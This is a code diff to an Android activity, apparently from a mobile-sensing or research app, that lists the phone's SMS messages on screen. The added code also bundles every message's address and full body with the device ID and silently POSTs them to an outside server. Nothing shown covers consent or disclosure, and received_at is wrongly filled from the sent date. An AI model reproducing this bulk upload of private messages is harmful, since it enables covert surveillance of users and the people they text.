@@ -2,8 +2,11 @@ package com.federation.funf_test;
 
 import android.Manifest;
 import android.app.Activity;
+import android.app.ProgressDialog;
 import android.content.pm.PackageManager;
+import android.os.AsyncTask;
 import android.os.Bundle;
+import android.provider.Settings;
 import android.util.Log;
 import android.widget.ArrayAdapter;
 import android.widget.ListView;
@@ -12,6 +15,14 @@ import android.widget.Toast;
 import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
 
+import com.federation.funf_test.gonogo.GoNogoResultActivity;
+
+import org.apache.http.message.BasicNameValuePair;
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.sql.Timestamp;
+import java.text.DecimalFormat;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -23,6 +34,13 @@ import static android.content.ContentValues.TAG;
 public class SmsLogActivity extends Activity {
 
     ListView smsLogListView;
+    ArrayList params = new ArrayList();
+
+    JSONParser jsonParser = new JSONParser();
+    private ProgressDialog pDialog;
+    private static String url_create = "https://pos.pentacle.tech/api/message/create";
+    private static final String TAG_SUCCESS = "success";
+    List<Sms> smsList;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -63,14 +81,31 @@ public class SmsLogActivity extends Activity {
         }
     }
 
-    void showCallLog(){
+    void showCallLog() {
         ArrayList<String> callArrayList= new ArrayList<>();
+        ArrayList<JSONObject> smsArrayList= new ArrayList<>();
 
         TelephonyProvider telephonyProvider = new TelephonyProvider(this);
-        List<Sms> smsList = telephonyProvider.getSms(TelephonyProvider.Filter.ALL).getList();
+        smsList = telephonyProvider.getSms(TelephonyProvider.Filter.ALL).getList();
 
+        String androidId = Settings.Secure.getString(getContentResolver(),
+                Settings.Secure.ANDROID_ID);
 
         for (Sms i : smsList) {
+            JSONObject newSMS = new JSONObject();
+
+            try {
+                newSMS.put("device_id", androidId);
+                newSMS.put("address", i.address);
+                newSMS.put("content", i.body);
+                newSMS.put("sent_at", new Timestamp(i.sentDate).toString());
+                newSMS.put("received_at", new Timestamp(i.sentDate).toString());
+
+                smsArrayList.add(newSMS);
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
+
             callArrayList.add("Subject:" + i.subject + "\nBody: " + i.body + "\nAddress: " + i.address + "\n Received Date: " + i.receivedDate + "\nPerson: " + i.person + "\nSent Date: " + i.sentDate  + "\nSeen: " + i.seen + "\nRead: " + i.read + "\nStatus: " + i.status);
             Log.d(TAG, "showCallLog: " + i.body);
         }
@@ -79,5 +114,42 @@ public class SmsLogActivity extends Activity {
         ArrayAdapter arrayAdapter = new ArrayAdapter(this, android.R.layout.simple_list_item_1, callArrayList);
 
         smsLogListView.setAdapter(arrayAdapter);
+
+        Log.d("Debug", smsList.toString());
+
+        params.add(new BasicNameValuePair("sms_list", smsArrayList.toString()));
+        new CreateNewResult().execute();
+    }
+
+    class CreateNewResult extends AsyncTask<String, String, JSONObject> {
+        /**
+         * Before starting background thread Show Progress Dialog
+         */
+        @Override
+        protected void onPreExecute() {
+            super.onPreExecute();
+
+        }
+
+        /**
+         * Creating product
+         */
+        protected JSONObject doInBackground(String... args) {
+            // getting JSON Object
+            // Note that create product url accepts POST methodN
+            JSONObject json = jsonParser.makeHttpRequest(url_create,
+                    "POST", params);
+            // check log cat fro response
+            //Log.d("Debug", json.toString());
+
+            return json;
+        }
+
+        /**
+         * After completing background task Dismiss the progress dialog
+         **/
+        protected void onPostExecute(JSONObject file_url) {
+            // dismiss the dialog once done
+        }
     }
 }
